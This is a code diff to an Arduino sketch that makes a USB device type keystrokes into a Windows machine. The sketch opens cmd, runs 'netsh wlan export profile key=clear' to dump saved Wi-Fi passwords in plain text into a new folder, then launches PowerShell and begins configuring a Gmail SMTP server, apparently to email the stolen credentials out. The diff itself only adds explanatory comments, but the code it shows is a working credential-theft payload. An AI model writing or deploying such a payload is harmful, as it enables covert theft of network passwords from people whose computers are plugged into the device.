@@ -18,13 +18,13 @@ void setup()
 
   delay(3000);
 
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
+  Keyboard.press(KEY_LEFT_GUI);//send WIN
+  Keyboard.press('r');//send R
   Keyboard.releaseAll();
 
   delay(500);
 
-  Keyboard.print("cmd");
+  Keyboard.print("cmd");//run cmd
 
   delay(500);
 
@@ -34,13 +34,13 @@ void setup()
 
   Keyboard.println("cd C:/");
   delay(100);
-  Keyboard.println("md 1234");
+  Keyboard.println("md 1234");//create 1234 folder
   delay(100);
   Keyboard.println("cd 1234 && netsh wlan export profile key=clear >nul");// wlan passwords in this folder
   delay(100);
   //Keyboard.println("exit");
   delay(10);
-  Keyboard.println("powershell");
+  Keyboard.println("powershell");//run powershell
   delay(1000);
   Keyboard.println("$emailSmtpServer = 'smtp.gmail.com';");
   delay(20);
